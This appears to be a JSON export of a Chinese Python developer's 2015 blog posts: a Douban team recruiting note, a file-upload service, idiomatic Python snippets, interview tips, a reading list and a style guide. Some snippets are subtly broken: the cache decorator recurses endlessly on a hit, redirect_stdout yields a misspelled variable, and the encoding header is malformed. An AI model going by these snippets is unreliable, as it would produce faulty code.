    "content": "### 前言\n\n之前也发布一篇[招聘贴](http://www.dongwm.com/archives/zhi-ding-dou-ban-tiao-mu-zu-zhao-pin/). 这里只说一些不一样的.\n不一样的是现在我已经开始负责条目组的技术. 在这里我主要写给想来条目组的同学.\n\n为了让想来豆瓣的人对我们组有个了解. 我还是先说一下我们组的情况.\n\n#### 负责的产品线\n\n[东西](http://dongxi.douban.com), [读书](http://book.douban.com), [电影](http://movie.douban.com), [音乐](http://music.douban.com) 以及条目, 条目就是www.douban.com/subject/xxx这样的地址.\n目前主要包含游戏和移动应用, 正在扩展更多玩法和种类.\n\n#### 工作范围\n\n组内的同事都是前后端都可以, 只有一些比较大的前端需求需要前端部门的同事来协作. 目前就是人少事多. 组内招聘严格, 本次豆瓣实习生招聘挖掘没有合适的人\n\n#### 这个组不太一样的地方\n\n1. 上面说的本组维护了多个知名的产品线. 你也可以看到非常多的知名id的代码.\n2. 本组是全豆瓣对代码要求最严格的组, 强制要求flake8. 且有很多自动化的工具帮你改正 - 比如你的PR不符合flake8, 那么CODE上对应位置就会出现对应规范的评论(创意源自quora的qlint)\n3. 本组的code review非常严格, 我们只欢迎最正确, 最有效率的方式写代码. 尤其对职业初期/实习生来说是一个非常好的机会. 我们可以帮你养成非常多的代码习惯的python开发能力.\n4. 我们欢迎使用新技术, 在时间容许的前提下, 鼓励使用更潮流的工具/库 - 这也是对我们组内成员最大的压力. 我们保证你会一直进步,而不是来豆瓣养老\n5. 我们组准备在豆瓣内率先支持es6\n\n### 负责技术的我\n\n1. 我参与很多开源项目, 因为之前是运维开发, 所以主要领域都在devops上. 通用的知名的项目包括ipython/pip, 我也给python标准库贡献过代码\n2. 我个人在做一个python的社区 [firefly](https://github.com/python-cn/firefly/). 未来会一直坚持下去\n3. 我接手了CODE(2014 pycon第一个议题)在豆瓣内部的迭代, 以及开源计划. 我的目的就是让豆瓣内部和开源项目的版本一致\n4. 个人其他信息: 使用emacs, 曾经看<黑客与画家>后用commonlisp写了第一个网站,从此决定做产品开发. 目前在用react做一些事情\n\n### 联系我\n\nqq: 61966225\nmail: ciici123#gmail.com, dongweiming#douban.com\n",
    "date": {
      "year": "2015",
      "month": "August",
      "day": "22"
    }
  },
  {
    "id": 311,
    "title": "r - 上传文件服务",
    "category": "react",
    "tags": [

    ],
    "url": "/archives/r-shang-chuan-wen-jian-fu-wu/",
    "content": "### 前言\n\n豆瓣内部有一些基础设施我认为做得都很好, 比如bridge和p. 一是身为用户的体验, 一个是我以开发的角度会去想我能不能做的更好.\n\n这些基础设施凝聚了豆瓣早期的工程师文化的精髓, 至今还在影响着每个豆瓣的工程师.\n\n今天我们聊到的是[p](https://github.com/qingfeng/p) - 一个文件上传托管服务, 一个被严重低估了的工具, 它已经被清风老师拆分出来不需要跑在dae上.\n而我今天推荐的就是我用react+es6plus+webpack重写的版本 [r](https://github.com/dongweiming/r)\n\n为什么说我认为被低估呢? 目前star也才五十几. 当时开始用p. 我对效果非常惊艳.\n\n如果你很好奇是不是也会这么认为. 可以先看个heroku的[demo](https://vast-brushlands-4477.herokuapp.com/). 因为连接了heroku的远程cleardb(mysql的封装), 上传反映略慢. 而本地会很流畅. 主要看效果吧.\n\n\n### r的用途\n\n身在互联网工作, 会经常有这样的需求\n\n1. 希望上传后的文件(包含图片)可以被永久存放.\n2. 想在github(CODE)上, 能方便的引用一些bug截图(甚至在多个地方引用).\n3. 希望上传的文件(包含图片), 能有一个比较好的预览页(包含文件大小, 文件类型, 上传时间等), 下载地址, 也能生成短链接, 二维码\n4. 希望能对某上传的图片传一些参数做对应的缩放和剪切\n5. 身在互联网, 页面太low, 效果不炫, 作为工程师, 用起来是会有抵制心情的.\n\n对. r(p) 就可以做这些事.\n\n\n### 用到的其他技术\n\nFlask, SQLAlchemy, Mako, Pillow\n",
    "date": {
      "year": "2015",
      "month": "September",
      "day": "20"
    }
  },
  {
    "id": 312,
    "title": "idiomatic python",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/idiomatic-python/",
    "content": "### 前言\n\n算来学会python已经4年有余, 使用它作为我的工作语言也3年了. 这个过程中我读过一些书, 看了很多人的博客.\n也读了一些开源项目的代码, 但是尤其重要的是和同事在一起得到的进步. 一直到现在我都有习惯了解python, 提高自己的python能力\n\n说到idiomatic. python有自己独特的语法和习惯. 而实现同样功能的代码不用的人呢也会使用不同的方式.\n写出来的代码内容也有非常大的区别, 但是总是会有一个是更好的, idiomatic的写法. 今天突然翻到了一个我之前一直维护的keynote. 这里面记录了我总结和从其他的ppt或者代码里看到更优美的写法.\n其中有些已经放在python3中, 说明这样的功能确实是程序员蛮有用的. 我整理了一下. 来给大家分享下.\n\nPS: 这些是编程的思维, 举一反三, 再适合的时候利用上.\n\n#### 循环列表, 直到找到符合的结果, 没有结果返回一个默认值\n\n通常这样:\n\n```python\na = -1\nfor i in range(1, 10):\n    if not i % 4:\n        a = i\n        break\n# a = 4\n```\n\n更好的写法:\n\n```python\na = ''\na = next((i for i in range(1, 10) if not i % 4), -1)\n# a = 4\n```\n\n#### 执行调用直到某种情况\n\n通常这样:\n\n```python\nblocks = []\nwhile True:\n    block = f.read(32)\n    if block == '':\n        break\n    blocks.append(block)\n```\n\n更好的写法:\n\n```python\nfrom functools import partial\nblocks = []\nfor block in iter(partial(f.read, 32), ''):\n    blocks.append(block)\n```\n\n#### 标记区分\n\n\n```python\ndef find(seq, target):\n    found = False\n    for i, value in enumerate(seq):\n        if value == target:\n            found = True\n            break\n    if not found:\n        return -1\n    return i\n```\n\n更好的写法:\n\n```python\ndef find(seq, target):\n    for i, value in enumerate(seq):\n        if value == target:\n            break\n    else:\n        return -1\n    return i\n```\n\n#### threading.Lock\n\n```python\nlock = threading.Lock()\nlock.acquire()\n\ntry:\n    print 'Critical section 1'\n    print 'Critical section 2'\nfinally:\n    lock.release()\n```\n\n其实是这样的:\n\n```python\nlock = threading.Lock()\n\nwith lock:\n    print 'Critical section 1'\n    print 'Critical section 2'\n```\n\n#### 忽略抛出的异常\n\n```python\ntry:\n    os.remove('somefile.tmp')\nexcept OSError:\n    pass\n```\n\n```python\nwith ignored(OSError):\n    os.remove('somefile.tmp')\n```\n\n就算用python2, 我也强烈建议把这样的函数放在项目里\n\n```python\n@contextmanager\ndef ignored(*exceptions):\n    try:\n        yield\n    except exceptions:\n        pass\n```\n\n如果你使用python3.4或以上可以使用标准库的 `contextlib.suppress`\n\n```python\nclass suppress:\n    def __init__(self, *exceptions):\n        self._exceptions = exceptions\n    def __enter__(self):\n        pass\n    def __exit__(self, exctype, excinst, exctb):\n        return exctype is not None and issubclass(exctype, self._exceptions)\n```\n\n#### 直接把输出存进文件中\n\n```python\nwith open('help.txt', 'w') as f:\n    oldstdout = sys.stdout\n    sys.stdout = f\n    try:\n        help(pow)\n    finally:\n        sys.stdout = oldstdout\n```\n\n同样使用python3.4以上可以使用\n\n```python\nwith open('help.txt', 'w') as f:\n    with redirect_stdout(f):\n        help(pow)\n```\n\nredirect_stdout是这样的:\n\n```python\n@contextmanager\ndef redirect_stdout(fileobj):\n    oldstdout = sys.stdout\n    sys.stdout = fileobj\n    try:\n        yield fieldobj\n    finally:\n        sys.stdout = oldstdout\n```\n\n#### 最简单的缓存\n\n通常这样实现缓存:\n\n```python\ndef web_lookup(url, saved={}):\n    if url in saved:\n        return saved[url]\n    page = urllib.urlopen(url).read()\n    saved[url] = page\n    return page\n```\n\n可以这样写\n\n\n```python\n@cache\ndef web_lookup(url):\n    return urllib.urlopen(url).read()\n\ndef cache(func):\n    saved = {}\n    @wraps(func)\n    def newfunc(*args):\n        if args in saved:\n            return newfunc(*args)\n        result = func(*args)\n        saved[args] = result\n        return result\n    return newfunc\n```\n",
    "date": {
      "year": "2015",
      "month": "October",
      "day": "24"
    }
  },
  {
    "id": 313,
    "title": "聊聊python面试这件事儿",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/liao-liao-pythonmian-shi-zhe-jian-shi-er/",
    "content": "### 前言\n\n今天在微博上被私信, 聊了好久的关于python面试的事情. 其实感觉蛮经常的和很多人在聊这个话题. 尤其是建了一个python学习交流群之后, 群里讨论的, 私聊我的, 问的比较多的真的有python面试相关的.\n总结起来大概以下几种:\n\n1. python面试最常用的面试题有哪些?\n2. 某个面试题感觉回答的不好, 问怎么回答比较好.\n3. 有什么面试经验可以分享.\n4. 豆瓣面试一般问什么 - 我是不可能泄题的, 以后不要这么可爱了......\n\n突然觉得有必要专门聊聊python面试这件事儿. 随便分享下我的故事.\n\n工作了几年, 必然面过几家. 我不是面霸, 但是也肯定有感觉特别奇葩的, 没对上眼的, 完虐我的，励志的，\n让我感动的. 让我感恩的.\n\n### 来个趣事儿\n\n国内python圈有名的公司不多. 12年的时候觉得要从运维开发转型为真正的开发, 面试了某知名公司S. 一直到现在我还觉得他的面试模式很好 -\n初步筛选之后会发面试题, 2个题目任选其一, 一周做好. 当时python刚学会一年多, 反正蛮辛苦的还是做完了. 后来接到一面的电话.\n当时觉得他们的工作环境特别好, 想着能留下来该多好. 这个组的面试风格比较特别 - 三个组员一起来面试, 轮流问问题, 有技术的, 有个人兴趣的,\n有职业规划的. 为什么说这个呢? 这是我工作以来影响最深的面试, 甚至说对我未来影响很大,\n一直到现在我都非常感谢他们. 现在我每次面试其他人, 都要花的时间比较多, 希望挖掘更多的候选人的优点, 给更多的建议和帮助. 总是想起他们对我的建议. 我们说了什么呢?\n\n我清楚的记得几个事情\n\n1. 看我简历学了熟悉django. 问我django请求到响应的流程. 没有回答上来. 其中一个面试官给我解释下流程.\n2. 问了一些python语法, 应用场景, 但是我大都没有深入了解, 事后我挨个查了这些知识点, 发现其实我只是学会了皮毛\n3. 无意间聊到了编辑器, 我说用vim, 但是只是会用`:q`, `:%s`这有限的几个. 他们说这么久了, 就没有想想应该花时间好好的学习下, 提高工作效率么?\n很难想象我是怎么开发的.. 说了很多, 我都有点完全被鄙视的想快点结束这个面试了.\n\n面试其实时间还挺长的. 最后我问了我每次面试结束都会问的问题: 你们对我有什么建议?\n\n他们说了这么几点, 和大家共勉\n\n1. 他们觉得我买了好多书, 想看想学的很多, 但是都没有深入. 建议我砍掉一半的兴趣, 把这些时间专注于做其中的几件\n2. 一个领域学习1，2个就好了. 比如web框架. 只要学好django或者flask, 理解原理. 用什么框架已经不重要了\n3. 好好学习一个编辑器. 驾驭好它, 让它提高你的工作效率.\n4. python学的不够深入, 建议我在细节上一个一个的抠, 力争弄清楚每一个, 积少成多\n\n说到这里, 好像没啥有趣的.. 对吧\n\n14年初, 在我面试豆瓣前, 我特意给S当时虐我的三人之一发邮件. 希望获得一个面试机会. 大概因为之前特意吐槽了S开源的一个项目还对我有兴趣,\n很快又拿到了面试题. 这次的要难很多, 我还拖了一天交卷. 但是还是获得了一面的机会. 然后一直到最后谈薪资.\n\n不同的是, 当时三人已经只剩下一个. 面试过程也没再问python问题(面试题答案应该已经证明了).\n\n当时我已经准备好虐他们了....\n\n1. 我真的不再关注那么多的领域, 当时买的好多书甚至因为搬家给卖掉了却出来没看过\n2. 我曾经专注的看过python标准库和一些项目的代码, 给很多开源项目贡献代码, 甚至给python标准库贡献了代码\n3. 我都不用vim, 改用emacs了\n4. 后来面试豆瓣时候也基本没有问python问题, 可见我python能力还好 (*＾ー＾)\n\n还没完....\n\n以前一面某S的一个工程师. 聊着聊着.\n\n他说: 你知不知道有个叫做XXX的?\n我说: 我就是.\n他说: 啊！ 我还在想我会不会遇到你呢?\n我说: 嘿嘿, 你如愿了\n他说: 之前听别人说过你. balabala\n\n机会是给有准备的人的. 不是python工作不好找, 只是没学好. 当时去S面试是个下午, 那天阳光和煦,\n阳光照在我们那个屋子里面的玻璃桌上面, 面试的气氛很轻松. 当时觉得他们每个人对自己做的事情，对python都非常了解,\n你是不是也想去这样的环境呢? 那么努力吧..\n\n我来豆瓣也是一个励志的故事, 但是有点脱题了, 我们开始说python面试吧\n\n### 我推崇的面试方式\n\n这个更适合面试官来看\n\n1. 上面提到的, 决定要不要一面, 先发面试题来做, 看题目功能实现, 代码风格, 注释等和团队文化匹配度决定要不要一面,\n更少的减少无用面试时间\n2. 知道创宇有一道爬虫的面试题写在博客里面, 想去的人把题做完发给他们就好了. 这道题确实不错.\npython掌握不好的确实做的会比较吃力, 也会直接暴露细节点掌握情况, 也可能会留下惊喜. 这样模式的题目也是一个筛选合适人才的办法\n\n### 候选人应该做好哪些技术准备呢?\n\n网上可以搜到一些面试题, 找了一些还不错的链接列出来\n\n```python\nhttp://programmers.stackexchange.com/questions/21917/python-interview-questions\nhttps://github.com/sigmavirus24/python-interview-questions\nhttps://gist.github.com/xiangzhuyuan/7454001522d275021b2d\nhttps://github.com/ContinuumIO/interview-questions\nhttps://github.com/Flowerowl/python_articles\nhttp://marselester.com/preparation-to-python-interview.html\nhttps://github.com/zachwill/cracking-the-coding-interview\nhttp://www.bogotobogo.com/python/python_interview_questions.php\nhttps://www.quora.com/What-are-good-Python-interview-questions\nhttps://www.reddit.com/r/Python/comments/1knw7z/python_interview_questions\nhttps://github.com/1st/interview/blob/master/python.md\n\n还有2个中文:\n\nhttps://github.com/taizilongxu/interview_python\nhttps://gist.github.com/prim/3e7f814187c715541ef2\n```\n\n毕竟我也是面试官, 就不划定那些是常见问题了. 防止我的主观意见对于未来影响面试者的评价公正性.\n而且我也要说一点, 我也不评论上述文章中的答案的正确性了. 大家还是需要在面试前先做些查询和研究了\n\n### 用心\n\n1. 去某公司面试前, 或者立志要去该公司. 最好先了解公司用到的python相关的技术栈, 这样可以有针对的准备相关内容\n2. 针对性的准备想要做的职位的python技能需求. 比如面试运维开发, 多准备系统, 数据库, 配置管理相关的知识, 比如web框架(除非了解到该职位需要)\n3. 及时关注python技能最新用法, 或者推荐用法. 多了解python3的趋势, 有可能会被面试官问到.\n4. 有个github账号. 能把自己的想法实践出来的python项目, 这样就多了了解你的机会. 可能在面试中就会少问你对应的技术点\n",
    "date": {
      "year": "2015",
      "month": "November",
      "day": "05"
    }
  },
  {
    "id": 314,
    "title": "python进阶必读汇总",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/pythonjin-jie-bi-du-hui-zong/",
    "content": "### 前言\n\n昨天翻到了一本在github开源的书: [Intermediate Python](http://book.pythontips.com/en/latest/index.html). 就有了此文, 梳理了一下一些之前翻到的对python语言细节点的答案, 博文等.\n\n\n### 英文的\n\n#### super\n\n[Python’s super() considered super!](https://rhettinger.wordpress.com/2011/05/26/super-considered-super/)\n\nrhettinger是python核心开发者. 这篇博文也是讲super最好最深入的博文了.\n\n#### 装饰器\n\n[Understanding Python Decorators](http://stackoverflow.com/questions/739654/how-can-i-make-a-chain-of-function-decorators-in-python/1594484#1594484)\n\n如果你还没有经常性的用装饰器, 你就要思考你的工作需求是不是的太简单了, 或者该考虑下这种AOP模式的开发的作用了\n\n#### 元类\n\n[What is a metaclass in Python?](http://stackoverflow.com/questions/100003/what-is-a-metaclass-in-python/6581949#6581949)\n[Metaclasses Demystified](http://archive.is/8owmb)\n\n元类是python高阶语法. 合理的使用可以减少大量重复性的代码.\n\n#### 防御性编程中的LBYL和EAFP\n\n[Try/catch or validation for speed?](http://stackoverflow.com/questions/5589532/try-catch-or-validation-for-speed/)\n\n这其实就是事先检查和异常处理2个方式的讨论\n\n#### \\_\\_new\\_\\_ 和 \\_\\_init\\_\\_\n\n[Python (and Python C API): __new__ versus __init__](http://stackoverflow.com/questions/4859129/python-and-python-c-api-new-versus-init/)\n\n这也是一个常见的面试题.\n\n#### self\n\n[Python \"self\" keyword](http://stackoverflow.com/questions/6019627/python-self-keyword)\n\n但是注意标题. 其实self不是一个关键词. 这里知识帮助你理解self的用意\n\n#### 协程和并发\n\n[A Curious Course on Coroutines and Concurrency](http://www.dabeaz.com/coroutines/)\n\n#### 生成器\n\n[Generator Tricks for Systems Programmers](http://www.dabeaz.com/generators/)\n\n#### python开发必读\n\n[Code Like a Pythonista: Idiomatic Python](http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html)\n\n#### unicode必读\n\n[Unicode In Python, Completely Demystified](http://farmdev.com/talks/unicode/)\n\n之前我曾经非常困惑于各种unicode报错\n\n#### exec和eval\n\n[Be careful with exec and eval in Python](http://lucumr.pocoo.org/2011/2/1/exec-in-python/)\n\n我的观点是从来都不要用exec/eval\n\n#### python性能贴士\n\n[PerformanceTips](https://wiki.python.org/moin/PythonSpeed/PerformanceTips)\n[Python Performance Tips, Part 1](http://www.monitis.com/blog/2012/02/13/python-performance-tips-part-1/)\n[Python Performance Tips, Part 2](http://www.monitis.com/blog/2012/03/21/python-performance-tips-part-2/)\n\n#### 描述符\n\n[How-To Guide for Descriptors](http://users.rcn.com/python/download/Descriptor.htm)\n\n#### python隐藏特性\n\n[Hidden features of Python](http://stackoverflow.com/questions/101268/hidden-features-of-python)\n\n#### 设计模式\n\n[python-patterns](https://github.com/faif/python-patterns)\n\n#### 初级python进阶文档\n\n[Intermediate and Advanced Software Carpentry in Python](http://ivory.idyll.org/articles/advanced-swc/)\n\n这个文档不是非常难, 甚至有点过时. 但是涵盖了python的方方面面. 非常有助于开拓视野, 更了解python\n\n\n### 中(译)文\n\n#### 如何理解Python关键字yield\n\n[What does the yield keyword do in Python](http://stackoverflow.com/questions/231767/the-python-yield-keyword-explained/231855#231855)\n[如何理解Python关键字yield](https://github.com/lzjun567/note/blob/master/note/python/what-does-the-yield-keyword-do-in-python.md)\n\nyield 是python语言里面让初学者困惑的关键词之一. 可以参考这2个理解让你对yield入门. 并且之后在正确的场景下使用\n\n#### 迭代器(Iterator)与生成器(Generator)的区别\n\n[Difference between Python's Generators and Iterators](http://stackoverflow.com/questions/2776829/difference-between-pythons-generators-and-iterators)\n[迭代器(Iterator)与生成器(Generator)的区别](https://github.com/lzjun567/note/blob/master/note/python/iterator_generator.md)\n\n这个是很常见的面试问题.\n\n#### 设计模式入门\n\n[写给Python初学者的设计模式入门](http://blog.jobbole.com/62023/)\n\n所谓设计模式其实就是*经过总结、优化的，对我们经常会碰到的一些编程问题的可重用解决方案*. 其实有时候会发现沃恩日常工作中的一些思考就是`设计模式`\n\n[python设计模式- 我写的](http://dongweiming.github.io/category/she-ji-mo-shi.html). 供参考.\n\n#### 描述符\n\n[Descriptor HowTo Guide](https://docs.python.org/2/howto/descriptor.html)\n[Python描述器引导(翻译)](http://pyzh.readthedocs.org/en/latest/Descriptor-HOW-TO-Guide.html)\n\ndescriptor是python高阶的特性, 可以了解下python设计的优雅. PS: 里面也提到了类方法和静态方法的区别\n\n#### 使用断言(assert)的正确场景\n\n[Python 使用断言的最佳时机](http://www.oschina.net/translate/when-to-use-assert)\n[Best practice for Python Assert](http://stackoverflow.com/questions/944592/best-practice-for-python-assert)\n\n[Python track: python idioms](http://courses.cms.caltech.edu/cs11/material/python/misc/python_idioms.html)\n[Python的惯例](http://pyzh.readthedocs.org/en/latest/python-idioms.html)\n\n#### 提高编码效率\n\n[Improving Your Python Productivity](http://ozkatz.github.io/improving-your-python-productivity.html)\n[提高你的Python编码效率](http://pyzh.readthedocs.org/en/latest/improving-your-python-productivity.html)\n\n#### Stackoverflow上的Python问题精选\n\n[Stackoverflow上的Python问题精选](http://pyzh.readthedocs.org/en/latest/python-questions-on-stackoverflow.html)\n\n#### Python魔法方法指南\n\n[Python魔法方法指南](http://pyzh.readthedocs.org/en/latest/python-magic-methods-guide.html)\n\n#### Python高级编程 - 我写的\n\n[Python高级编程](http://dongweiming.github.io/Expert-Python/)\n\n#### 洪强宁的ppt.\n\n[Python高级编程（二）](http://www.slideshare.net/hongqn/python-9915982)\n\nPS: 这个 `二` 和上一个没有任何次序关系\n",
    "date": {
      "year": "2015",
      "month": "November",
      "day": "08"
    }
  },
  {
    "id": 315,
    "title": "我理解的python最佳实践",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/wo-li-jie-de-pythonzui-jia-shi-jian/",
    "content": "### 前言\n\n对我来说, 以前每次面试是我审视自己, 检验自己的一种方式. 每次准备面试, 以及被面试官问住的时候才会发现,\n其实我python我学的还不够好; 工作中也是, 可以从其他的同事那里获得成长. 但是我今天说的是, 我也在自己总结和思考`最佳实践`这件事.\n\n\n我想很多人都会有意识的去读一些PEP(Python Enhancement Proposals). 了解语言设计者当时的考虑, 这些文案也是经过很长时间的讨论最后才实施的.\n既然想用好这门语言, 必然需要理解设计之美. 比如我听说gvanrossum使用emacs作为编辑器, 我也使用emacs, 就是希望我可以更贴近一些python\n\n本文根据 [The Best of the Best Practices (BOBP) Guide for Python](https://gist.github.com/sloria/7001839) 和 [Khan's style-guides](https://github.com/Khan/style-guides/blob/master/style/python.md)中对于开发中一些事物的理解和看法, 有出至PEP, 也有一些python界知名开发者, 我加入了一些我自己的理解和看法.\n\n### 价值观\n\n\n#### \"Build tools for others that you want to be built for you.\" - Kenneth Reitz (requests等知名库作者)\n\n你自己都不想用的东西做出来有什么意义呢?\n\n#### \"Simplicity is alway better than functionality.\" - Pieter Hintjens (ZeroMQ)\n\n我对函数式编程的看法一直是`看场景`, 甚至于我经常会对比性能, 义无反顾的使用性能最好的, 但是代码又不难懂和繁琐的\n\n#### \"Fit the 90% use-case. Ignore the nay sayers.\" - Kenneth Reitz\n\n程序员都有完美主义情怀, 但是其实往往我们是在偏激的看事情 - 用户其实不case\n\n#### \"Beautiful is better than ugly.\" - [PEP 20](http://www.python.org/dev/peps/pep-0020/)\n\n\n### 开发参考\n\n#### \"Explicit is better than implicit\" - [PEP 20](\"Explicit is better than implicit\" - PEP 20)\n\n不要留坑, 我经常看到一些复杂的代码, 这些代码的作者写的时候明显知道自己在做什么, 但是别人很难维护和看懂.\n所以我对自己的职业的基本要求就是: 那天我离职了, 后来接手的人不会经常骂我\n\n#### \"Readability counts.\" - [PEP 20](http://www.python.org/dev/peps/pep-0020)\n\n#### \"Anybody can fix anything.\" - [Khan's style-guides](https://github.com/Khan/style-guides/blob/master/style/python.md)\n\n我现在更多不是代码炫技, 我经常思考的怎么让最少的代码, 最简单的设计结构满足当前需求, 也能给未来一段时间里也有扩展性\n\n#### Fix each broken window (bad design, wrong decision, or poor code) as soon as it is discovered.\n\n我们改bug有个原则 - 测试要覆盖到出bug的地方. 每个人内心都有很高的代码质量的要求\n\n#### \"Now is better than never.\" - [PEP 20](http://www.python.org/dev/peps/pep-0020/)\n\n明日复明日, 明日何其多. 我们在代码review的时候, 问题需要在提出的时候就去改, 永远不会说下一次再说, 因为下一次大多时候是没有下一次了\n\n#### Test ruthlessly. Write docs for new features.\n\n#### Even more important that Test-Driven Development--Human-Driven Development\n\n\n### 一些细节\n\n#### PEP8\n\n很多人是排斥的, 假如你想让未来部门有自己的风格, 习惯. 让新人马上上手接受, PEP8是一个非常明智的选择\n\n#### 文件开头\n\n新的文件的开头需要加一些docstring. 描述文件的作用, 编辑者, 修改原因和日期等帮助阅读者的描述.\n\n不要添加`#!/usr/bin/python`(除非这个文件未来是一个可执行的文件), copyright, \\_\\_author\\_\\_或者其他内容.\n\n第一行建议添加`# coding-utf-8`\n\n#### 命名\n\n1. Variables, functions, methods, packages, modules\n\n    lower_case_with_underscores\n\n2. Classes and Exceptions\n\n    CapWords\n\n3. Protected methods and internal functions\n\n    \\_single\\_leading\\_underscore(self, ...)\n\n4. Private methods\n\n    \\_\\_double\\_leading\\_underscore(self, ...)\n\n5. Constants\n\n    ALL\\_CAPS\\_WITH\\_UNDERSCORES\n\n6. Avoid one-letter variables (esp. l, O, I).\n\n    永远不要使用没有意义的单字符作为变量名\n\nPS: 这点可以折中, 假如一个代码块代码逻辑很清晰, 而 这个短的便令也只是过程中的一个间接变量之类的情况下是可以接受的\n\n### Good or Bad\n\n列举一些正确和错误的用法.\n\n#### Avoid redundant labeling.\n\n```python\n# Good\nimport audio\n\ncore = audio.Core()\ncontroller = audio.Controller()\n\n# Bad\nimport audio\n\ncore = audio.AudioCore()\ncontroller = audio.AudioController()\n```\n\n不要使用重复意义的标签\n\n#### Prefer \"reverse notation\".\n\n```python\n# Good\nelements = ...\nelements_active = ...\nelements_defunct = ...\n\n# Bad\nelements = ...\nactive_elements = ...\ndefunct_elements ...\n```\n\n#### Avoid getter and setter methods.\n\n```python\n# Good\nperson.age = 42\n\n# Bad\nperson.set_age(42)\n```\n\n#### Indentation\n\n永远不要Tab和空格混用. 使用4个空格作为python缩进\n\n#### Imports\n\nImport entire modules instead of individual symbols within a module.\n\nPS: 这个时候可以参考tornado的代码用法.\n\n比如现在有这样一个包\n\n```bash\n$ tree\n└── canteen\n    ├── __init__.py\n    ├── sessions.py\n```\n\n```python\n# Good\nimport canteen\nimport canteen.sessions\nfrom canteen import sessions\n\n# Bad\nfrom canteen import get_user  # Symbol from canteen/__init__.py\nfrom canteen.sessions import get_session  # Symbol from canteen/sessions.py\n```\n\nPS: 除非这个第三方模块的文档显式的要求这些写\n\n#### Splitting tricky lines\n\n```python\n# Bad:\nbadge_name = badges.topic_exercise_badges.TopicExerciseBadge.name_for_topic_key_name(self.key().name())\n# Good:\nbadge_name = (badges.topic_exercise_badges.TopicExerciseBadge\n              .name_for_topic_key_name(self.key().name()))\n\n# Bad:\nself.redirect(\"/class_profile?selected_graph_type=%s&coach_email=%s&graph_query_params=%s\" %\n    (self.GRAPH_TYPE, urllib.quote(coach.email), urllib.quote(urllib.quote(self.request.query_string))))\n# Good:\nself.redirect(\n    \"/class_profile?selected_graph_type=%s&coach_email=%s\"\n    \"&graph_query_params=%s\" % (\n        self.GRAPH_TYPE,\n        urllib.quote(coach.email),\n        urllib.quote(urllib.quote(self.request.query_string))))\n```\n\n### 我添加的规则\n\n#### from ... import ...\n\n```python\n# Bad\nfrom aa import alonglonglonglonglong, alonglonglonglonglonglonglonglonglong, \\\n               alonglonglonglonglonglong\n\n# Good\nfrom aa import (alonglonglonglonglong, alonglonglonglonglonglonglonglonglong,\n                alonglonglonglonglonglong)\nfrom aa import (alonglonglonglonglong, alonglonglonglonglonglonglonglonglong,\n    alonglonglonglonglonglong, alonglonglonglonglonglonglong,\n    alonglonglonglonglonglong2)  # Good。 当引入的函数/类/变量很多时， 也可以选择空 4 个空格的方式， 而不需要和首行的左括号后对齐```\n\n#### 相对引用(relative import) 和 绝对引用(absolute import)\n\n```python\n$cat xx/models/user/consts.py  # 如果想引用这个变量\nTMP = 1\n\n$cat xx/views/user.py\nfrom xx.models.user.consts import TMP  # recommended。\n\n# 假如模块层级>=3。 比如 xx/models/user/consts.py 就在根目录下的第 3 级。 如果其他当前目录下源文件需要调用它的内容。 也可以选择相对引用\n$cat xx/models/user/main.py  # 需要和 consts.py 在一个目录下才可以\nfrom consts import TMP  # Bad\nfrom .consts import TMP  # Good\n\n# 而且只能在包内相对引用。 包外都需要绝对引用\n```\n",
    "date": {
      "year": "2015",
      "month": "November",
      "day": "15"
    }
  },
  {
    "id": 0,
    "title": "出错了",
    "url": "/404.html",
    "content": "<img src=\"/images/404.png\" />\n<p>您打开的页面不存在,以下是最近发布的文章,或者去主页<a href=\"/\">dongwm.com</a></p>\n<div id=\"blog-archives\" class=\"missing\">\n{% for post in site.posts limit: 10 %}\n<article>\n  {% include archive_post.html %}\n</article>\n{% endfor %}\n</div>\n~                                                                               \n~                                        \n"
  }
]